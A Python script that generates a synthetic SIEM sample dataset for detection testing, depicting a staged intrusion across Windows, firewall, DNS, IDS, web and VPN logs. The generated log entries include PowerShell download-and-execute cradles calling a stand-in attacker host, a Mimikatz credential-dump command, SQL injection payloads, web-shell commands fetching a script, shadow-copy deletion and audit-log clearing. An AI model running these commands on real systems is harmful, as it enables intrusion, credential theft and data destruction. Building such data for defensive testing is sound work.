#!/usr/bin/env python3
"""Generate the multi-source SIEM sample dataset in samples/siem/ (deterministic).

One coherent incident across seven sources, using documentation IP ranges only:
  192.0.2.0/24   internal LAN (TEST-NET-1)       198.51.100.0/29 ISP block / public web server
  203.0.113.0/24 external attacker infrastructure (TEST-NET-3)
A week of normal behaviour (the UEBA baseline) precedes the attack on 2026-10-18.
"""
import csv
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples" / "siem"
rnd = random.Random(42)
BASE = datetime(2026, 10, 11)
ATT = datetime(2026, 10, 18)
WS = {"alice": ("192.0.2.21", "WS-ALICE"), "bob": ("192.0.2.22", "WS-BOB"), "dave": ("192.0.2.23", "WS-DAVE"),
      "erin": ("192.0.2.24", "WS-ERIN")}
SERVERS = {"FS01": "192.0.2.30", "DB01": "192.0.2.40", "DC01": "192.0.2.5", "HR01": "192.0.2.31", "WEB01": "198.51.100.2"}


def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def windows():
    rows = []

    def ev(t, host, code, **kw):
        msg = kw.pop("Message", "")
        rows.append({"_time": iso(t), "host": host, "EventCode": code, "LogName": kw.pop("LogName", "Security"),
                     "Account_Name": kw.get("user", ""), "Target_Account": kw.get("target", ""),
                     "Source_Network_Address": kw.get("ip", ""), "Workstation_Name": kw.get("ws", ""),
                     "Logon_Type": kw.get("lt", ""), "Process_Name": kw.get("proc", ""),
                     "Parent_Process": kw.get("parent", ""), "CommandLine": kw.get("cmd", ""),
                     "Service_Name": kw.get("svc", ""), "Group_Name": kw.get("group", ""), "Message": msg})

    # Baseline week: office-hours logons from each user's own workstation
    for d in range(7):
        day = BASE + timedelta(days=d)
        if day.weekday() >= 5:
            continue
        for user, (ip, ws) in WS.items():
            for _ in range(3):
                t = day + timedelta(hours=rnd.randint(8, 16), minutes=rnd.randint(0, 59))
                ev(t, "FS01", 4624, user=user, ip=ip, ws=ws, lt=3, Message="An account was successfully logged on.")
        ev(day + timedelta(hours=10, minutes=5), "DB01", 4624, user="carol_adm", ip="192.0.2.10", ws="JUMP01", lt=10,
           Message="An account was successfully logged on.")
        ev(day + timedelta(hours=1), "BACKUP01", 4624, user="svc_backup", ip="", lt=5,
           Message="An account was successfully logged on.")
        ev(day + timedelta(hours=9, minutes=2), "FS01", 4625, user="dave", ip="192.0.2.23", ws="WS-DAVE", lt=3,
           Message="An account failed to log on. Failure Reason: Unknown user name or bad password.")

    a = ATT
    # Attack: VPN session for bob arrives as 192.0.2.200; RDP at 03:10 (unusual hour, new source)
    ev(a + timedelta(hours=3, minutes=10), "WS-BOB", 4624, user="bob", ip="192.0.2.200", ws="UNKNOWN", lt=10,
       Message="An account was successfully logged on.")
    ev(a + timedelta(hours=3, minutes=12), "WS-BOB", 4688, user="bob", proc="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       parent="C:\\Windows\\explorer.exe",
       cmd="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
       Message="A new process has been created.")
    ev(a + timedelta(hours=3, minutes=12, seconds=4), "WS-BOB", 4104, user="bob", LogName="Microsoft-Windows-PowerShell/Operational",
       cmd="IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')",
       Message="Creating Scriptblock text: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')")
    ev(a + timedelta(hours=3, minutes=20), "WS-BOB", 4688, user="bob", proc="C:\\Users\\Public\\m.exe",
       parent="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmd="m.exe privilege::debug sekurlsa::logonpasswords exit", Message="A new process has been created.")
    # Lateral movement with a stolen admin account from bob's workstation
    for i, (host, ip) in enumerate([("FS01", 0), ("DB01", 0), ("DC01", 0), ("HR01", 0), ("WEB01", 0)]):
        ev(a + timedelta(hours=3, minutes=25, seconds=40 * i), host, 4624, user="admin_it", ip="192.0.2.22",
           ws="WS-BOB", lt=3, Message="An account was successfully logged on.")
    ev(a + timedelta(hours=3, minutes=26), "DC01", 4672, user="admin_it", Message="Special privileges assigned to new logon. SeDebugPrivilege")
    ev(a + timedelta(hours=3, minutes=30), "DC01", 4720, user="admin_it", target="support_tmp",
       Message="A user account was created.")
    ev(a + timedelta(hours=3, minutes=30, seconds=20), "DC01", 4732, user="admin_it", target="support_tmp",
       group="Administrators", Message="A member was added to a security-enabled local group.")
    ev(a + timedelta(hours=3, minutes=32), "FS01", 7045, user="admin_it", svc="UpdaterSvc", LogName="System",
       proc="C:\\Users\\Public\\svc.exe", Message="A service was installed in the system. Service File Name: C:\\Users\\Public\\svc.exe")
    ev(a + timedelta(hours=3, minutes=33), "FS01", 4698, user="admin_it", svc="\\Microsoft\\Windows\\Updater",
       cmd="schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\Public\\svc.exe", Message="A scheduled task was created.")
    ev(a + timedelta(hours=3, minutes=40), "DB01", 4688, user="admin_it", proc="C:\\Program Files\\7-Zip\\7z.exe",
       cmd="7z.exe a -pS3cret! D:\\exports\\hr_dump.7z D:\\exports\\hr_full.bak", Message="A new process has been created.")
    ev(a + timedelta(hours=3, minutes=38), "DB01", 4688, user="admin_it", proc="C:\\Program Files\\Microsoft SQL Server\\bcp.exe",
       cmd="bcp \"SELECT * FROM hr.dbo.employees\" queryout D:\\exports\\hr_full.bak -T", Message="A new process has been created.")
    ev(a + timedelta(hours=3, minutes=50), "WS-BOB", 4688, user="bob", proc="C:\\Windows\\System32\\vssadmin.exe",
       cmd="vssadmin.exe delete shadows /all /quiet", Message="A new process has been created.")
    ev(a + timedelta(hours=3, minutes=55), "DC01", 4719, user="admin_it", Message="System audit policy was changed.")
    ev(a + timedelta(hours=3, minutes=57), "DC01", 1102, user="admin_it", Message="The audit log was cleared.")
    # A service account used interactively (policy says it never should be)
    ev(a + timedelta(hours=3, minutes=35), "HR01", 4624, user="svc_backup", ip="192.0.2.22", ws="WS-BOB", lt=10,
       Message="An account was successfully logged on.")
    # Benign: alice normal day
    for m in (8 * 60 + 40, 11 * 60 + 5):
        ev(a + timedelta(minutes=m), "FS01", 4624, user="alice", ip="192.0.2.21", ws="WS-ALICE", lt=3,
           Message="An account was successfully logged on.")
    rows.sort(key=lambda r: r["_time"])
    with open(OUT / "windows_security.csv", "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)


def firewall():
    recs = []

    def fw(t, src, dst, dport, action="allow", sent=0, recv=0, proto="tcp", rule="default", sport=None):
        recs.append({"timestamp": iso(t), "device": "fw01", "src_ip": src, "dst_ip": dst,
                     "src_port": sport or rnd.randint(40000, 65000), "dst_port": dport, "proto": proto,
                     "action": action, "bytes_sent": sent, "bytes_received": recv, "rule": rule})

    # Baseline: workstations -> internal DNS and web browsing, servers -> update mirror
    for d in range(8):
        day = BASE + timedelta(days=d)
        for user, (ip, _) in WS.items():
            for _ in range(6):
                t = day + timedelta(hours=rnd.randint(8, 17), minutes=rnd.randint(0, 59))
                fw(t, ip, "192.0.2.53", 53, proto="udp", sent=80, recv=200, rule="dns")
                fw(t + timedelta(seconds=2), ip, f"203.0.113.{rnd.randint(130, 140)}", 443, sent=rnd.randint(2000, 9000),
                   recv=rnd.randint(20000, 90000), rule="web")
        fw(day + timedelta(hours=2), "192.0.2.40", "203.0.113.200", 443, sent=4000, recv=900000, rule="updates")
    a = ATT
    # External port scan of the public web server (denied)
    for i, port in enumerate(list(range(20, 26)) + [53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 3306, 3389, 5432, 5900, 8080]):
        fw(a + timedelta(hours=2, seconds=i), "203.0.113.50", "198.51.100.2", port,
           action="allow" if port in (80, 443) else "deny", rule="perimeter")
    # The web attack that follows the scan reaches WEB01 through the allowed web port
    for m in (5, 8, 11, 12, 13):
        fw(a + timedelta(hours=2, minutes=m), "203.0.113.50", "198.51.100.2", 80, sent=900, recv=6000, rule="perimeter")
    # ...and the web shell pulls a second stage from the attacker's server (egress allowed)
    fw(a + timedelta(hours=2, minutes=14, seconds=1), "198.51.100.2", "203.0.113.61", 80, sent=400, recv=18000, rule="web")
    # Approved vulnerability scanner sweeping internal servers (context, still reported)
    for i, port in enumerate(range(1, 40)):
        fw(a + timedelta(hours=2, minutes=30, seconds=i), "192.0.2.250", "192.0.2.30", port, action="deny", rule="internal")
    # C2 beaconing from WS-BOB every ~60 s
    t = a + timedelta(hours=3, minutes=14)
    while t < a + timedelta(hours=4, minutes=30):
        fw(t, "192.0.2.22", "203.0.113.99", 443, sent=rnd.randint(300, 340), recv=rnd.randint(600, 700), rule="web")
        t += timedelta(seconds=60 + rnd.randint(-2, 2))
    # Exfiltration from DB01
    fw(a + timedelta(hours=3, minutes=45), "192.0.2.40", "203.0.113.150", 443, sent=2_400_000_000, recv=50_000, rule="web")
    # SMB from bob's workstation to many servers (lateral movement on the wire)
    for i, ip in enumerate(SERVERS.values()):
        fw(a + timedelta(hours=3, minutes=25, seconds=40 * i), "192.0.2.22", ip, 445, rule="internal")
    # Repeated denied connections from an internal host to a blocked port
    for i in range(30):
        fw(a + timedelta(hours=3, minutes=36, seconds=i * 3), "192.0.2.31", "203.0.113.70", 4444, action="deny", rule="egress")
    # Firewall rule change made from a workstation (not the management jump host)
    recs.append({"timestamp": iso(a + timedelta(hours=3, minutes=44)), "device": "fw01", "src_ip": "192.0.2.22",
                 "dst_ip": "192.0.2.1", "dst_port": 443, "action": "config_change", "user": "admin_it",
                 "message": "Firewall policy modified: rule 'allow-any-out' added by admin_it", "rule": "admin"})
    recs.sort(key=lambda r: r["timestamp"])
    with open(OUT / "firewall.jsonl", "w", encoding="utf-8") as fh:
        for r in recs:
            fh.write(json.dumps(r) + "\n")


def dns():
    recs = []
    for d in range(8):
        day = BASE + timedelta(days=d)
        for user, (ip, _) in WS.items():
            for name in ("intranet.example.local", "mail.example.com", "www.example.org", "updates.example.net"):
                recs.append({"@timestamp": iso(day + timedelta(hours=rnd.randint(8, 17), minutes=rnd.randint(0, 59))),
                             "client": {"ip": ip}, "dns": {"question": {"name": name, "type": "A"}, "response_code": "NOERROR"}})
    a = ATT + timedelta(hours=3, minutes=50)
    for i in range(40):  # DNS tunnelling: long encoded labels, TXT records
        label = "".join(rnd.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(52))
        recs.append({"@timestamp": iso(a + timedelta(seconds=i * 5)), "client": {"ip": "192.0.2.22"},
                     "dns": {"question": {"name": f"{label}.t.tunnel-example.net", "type": "TXT"}, "response_code": "NOERROR"}})
    for i in range(25):  # DGA-like NXDOMAIN burst
        label = "".join(rnd.choice("bcdfghjklmnpqrstvwxz0123456789") for _ in range(rnd.randint(14, 20)))
        recs.append({"@timestamp": iso(a + timedelta(minutes=5, seconds=i * 2)), "client": {"ip": "192.0.2.22"},
                     "dns": {"question": {"name": f"{label}.info", "type": "A"}, "response_code": "NXDOMAIN"}})
    recs.sort(key=lambda r: r["@timestamp"])
    (OUT / "dns.json").write_text(json.dumps(recs, indent=1), encoding="utf-8")


def ids():
    lines = [
        "Oct 18 03:14:20 ids01 CEF:0|OISF|Suricata|7.0|2027865|ET MALWARE Possible Cobalt Strike Beacon|9|src=192.0.2.22 dst=203.0.113.99 spt=51544 dpt=443 proto=TCP act=alert",
        "Oct 18 02:00:03 ids01 CEF:0|OISF|Suricata|7.0|2010937|ET SCAN Suspicious inbound to mySQL port 3306|5|src=203.0.113.50 dst=198.51.100.2 spt=40112 dpt=3306 proto=TCP act=alert",
        "Oct 18 03:45:30 ids01 CEF:0|OISF|Suricata|7.0|2024897|ET POLICY Possible data exfiltration large outbound TLS|7|src=192.0.2.40 dst=203.0.113.150 spt=50211 dpt=443 proto=TCP act=alert",
        "Oct 18 02:13:01 ids01 CEF:0|OISF|Suricata|7.0|2100498|GPL ATTACK_RESPONSE id check returned root|7|src=198.51.100.2 dst=203.0.113.50 spt=80 dpt=51000 proto=TCP act=alert",
    ]
    (OUT / "ids_alerts.cef").write_text("\n".join(sorted(lines, key=lambda l: l[:15])) + "\n", encoding="utf-8")


def web():
    """Apache combined log of WEB01: normal visitors, then directory brute force, SQL injection,
    web-shell upload and commands through the shell from the scanning IP."""
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0"
    lines = []

    def req(t, ip, method, url, status, size=2400, agent=ua, ref="-"):
        lines.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "{method} {url} HTTP/1.1" {status} {size} '
                         f'"{ref}" "{agent}"'))

    for d in range(8):
        day = BASE + timedelta(days=d)
        for _ in range(12):
            t = day + timedelta(hours=rnd.randint(8, 20), minutes=rnd.randint(0, 59))
            req(t, f"198.51.100.{rnd.randint(10, 60)}", "GET", rnd.choice(["/", "/products.php?id=3", "/about.html",
                                                                          "/contact.html", "/products.php?id=7"]), 200)
    a = ATT + timedelta(hours=2, minutes=5)
    gob = "gobuster/3.6"
    for i, (url, st) in enumerate([("/admin/", 403), ("/backup.zip", 404), ("/.env", 404), ("/.git/config", 404),
                                   ("/phpmyadmin/", 404), ("/uploads/", 403), ("/login.php", 200), ("/admin/upload.php", 302)]):
        req(a + timedelta(seconds=3 * i), "203.0.113.50", "GET", url, st, 320, gob)
    sq = "sqlmap/1.8.2#stable"
    a = ATT + timedelta(hours=2, minutes=8)
    req(a, "203.0.113.50", "GET", "/products.php?id=3%27%20OR%20%271%27=%271", 500, 610, sq)
    req(a + timedelta(seconds=20), "203.0.113.50", "GET",
        "/products.php?id=3%20UNION%20SELECT%20username,password%20FROM%20admin_users--", 200, 5120, sq)
    a = ATT + timedelta(hours=2, minutes=11)
    req(a, "203.0.113.50", "POST", "/login.php", 302, 0, ua)
    req(a + timedelta(seconds=90), "203.0.113.50", "POST", "/admin/upload.php", 200, 410, ua, "/admin/")
    for k, cmd in enumerate(["id", "cat%20/etc/passwd", "wget%20http://203.0.113.61/x.sh%20-O%20/tmp/x.sh"]):
        req(ATT + timedelta(hours=2, minutes=13, seconds=30 * k), "203.0.113.50", "GET", f"/uploads/shell.php?cmd={cmd}",
            200, 180 + 40 * k, ua)
    lines.sort()
    (OUT / "web_access.log").write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")


def vpn():
    lines = []
    users = ["alice", "bob", "carol_adm", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "mallory",
             "oscar", "peggy", "trent", "victor", "walter"]
    t = ATT + timedelta(hours=2, minutes=55)
    for i, u in enumerate(users):
        for k in range(1 if i % 3 else 2):
            t += timedelta(seconds=7)
            lines.append(f"{t:%b %d %H:%M:%S} vpn01 vpnd[331]: event=auth_failure user={u} src_ip=203.0.113.77 "
                         f"reason=bad_password protocol=sslvpn")
    t += timedelta(seconds=30)
    lines.append(f"{t:%b %d %H:%M:%S} vpn01 vpnd[331]: event=auth_success user=bob src_ip=203.0.113.77 "
                 f"assigned_ip=192.0.2.200 protocol=sslvpn session_id=vpn-8812")
    for d in range(5):  # bob's normal VPN use from his ISP at home in the evening
        tt = BASE + timedelta(days=d, hours=19, minutes=rnd.randint(0, 50))
        lines.append(f"{tt:%b %d %H:%M:%S} vpn01 vpnd[331]: event=auth_success user=bob src_ip=198.51.100.5 "
                        f"assigned_ip=192.0.2.201 protocol=sslvpn session_id=vpn-{7000 + d}")
    lines.sort(key=lambda l: datetime.strptime("2026 " + l[:15], "%Y %b %d %H:%M:%S"))
    (OUT / "vpn.log").write_text("\n".join(lines) + "\n", encoding="utf-8")


def winxml():
    ev = []
    for i in range(6):
        t = ATT + timedelta(hours=3, minutes=2, seconds=i * 10)
        ev.append(f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="{t:%Y-%m-%dT%H:%M:%S}.000000Z"/><Channel>Security</Channel><Computer>DC01.example.local</Computer></System><EventData><Data Name="TargetUserName">administrator</Data><Data Name="IpAddress">192.0.2.200</Data><Data Name="LogonType">3</Data><Data Name="WorkstationName">UNKNOWN</Data></EventData></Event>""")
    t = ATT + timedelta(hours=3, minutes=3, seconds=10)
    ev.append(f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4740</EventID><TimeCreated SystemTime="{t:%Y-%m-%dT%H:%M:%S}.000000Z"/><Channel>Security</Channel><Computer>DC01.example.local</Computer></System><EventData><Data Name="TargetUserName">administrator</Data><Data Name="TargetDomainName">WS-BOB</Data></EventData></Event>""")
    (OUT / "windows_dc.xml").write_text("<Events>\n" + "\n".join(ev) + "\n</Events>\n", encoding="utf-8")


def trust_demo():
    data = {
        "_comment": "Demo inventory for the sample dataset only (documentation ranges). Import it from "
                    "Trusted Networks & Assets -> Import to see trust context in the analysis.",
        "trusted_networks": [
            {"id": "lan", "name": "Head office LAN", "cidr": "192.0.2.0/24", "zone": "internal", "criticality": "high", "enabled": True},
            {"id": "vpnpool", "name": "VPN client pool", "cidr": "192.0.2.192/27", "zone": "vpn", "enabled": True}],
        "isp_public_ips": [{"id": "isp", "name": "ISP static block", "cidr": "198.51.100.0/29", "isp": "Example ISP", "enabled": True}],
        "trusted_assets": [
            {"id": "dc01", "name": "DC01 domain controller", "ip": "192.0.2.5", "hostname": "DC01", "asset_type": "domain_controller", "criticality": "critical", "zone": "servers", "enabled": True},
            {"id": "dns", "name": "Internal DNS", "ip": "192.0.2.53", "asset_type": "dns_server", "allowed_services": [53], "criticality": "high", "enabled": True},
            {"id": "fs01", "name": "FS01 file server", "ip": "192.0.2.30", "hostname": "FS01", "asset_type": "server", "criticality": "high", "enabled": True},
            {"id": "db01", "name": "DB01 HR database", "ip": "192.0.2.40", "hostname": "DB01", "asset_type": "database", "criticality": "critical", "enabled": True},
            {"id": "jump", "name": "Admin jump host", "ip": "192.0.2.10", "hostname": "JUMP01", "asset_type": "jump_host", "classification": "management_host", "enabled": True},
            {"id": "scan", "name": "Vulnerability scanner", "ip": "192.0.2.250", "asset_type": "scanner", "classification": "monitoring_scanner", "enabled": True, "notes": "Approved weekly scans"},
            {"id": "web", "name": "Public web server", "ip": "198.51.100.2", "hostname": "WEB01", "asset_type": "web_server", "classification": "public_server", "allowed_services": [80, 443], "criticality": "high", "enabled": True},
            {"id": "fw", "name": "Perimeter firewall", "ip": "192.0.2.1", "asset_type": "firewall", "classification": "management_host", "criticality": "critical", "enabled": True},
            {"id": "ws-bob", "name": "Bob's workstation", "ip": "192.0.2.22", "hostname": "WS-BOB", "asset_type": "workstation", "criticality": "medium", "enabled": True}],
        "approved_external_services": [{"id": "upd", "name": "Update mirror", "cidr": "203.0.113.200/32", "enabled": True}],
        "suspicious_indicators": [],
        "service_accounts": [{"id": "svcb", "name": "Backup service", "username": "svc_backup", "allowed_hosts": ["BACKUP01"], "interactive_allowed": False, "enabled": True}],
    }
    (OUT / "trusted_assets.demo.json").write_text(json.dumps(data, indent=2), encoding="utf-8")
    (OUT / "ioc_feed.csv").write_text(
        "type,value,source,description\n"
        "ip,203.0.113.99,EXAMPLE-FEED,Example C2 server (documentation range)\n"
        "domain,tunnel-example.net,EXAMPLE-FEED,Example DNS tunnelling domain\n"
        "ip,203.0.113.150,EXAMPLE-FEED,Example exfiltration endpoint\n"
        "sha256,9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08,EXAMPLE-FEED,Example malware hash\n",
        encoding="utf-8")


if __name__ == "__main__":
    OUT.mkdir(parents=True, exist_ok=True)
    for f in (windows, firewall, dns, ids, vpn, winxml, web, trust_demo):
        f()
    print("written:", ", ".join(sorted(p.name for p in OUT.iterdir())))
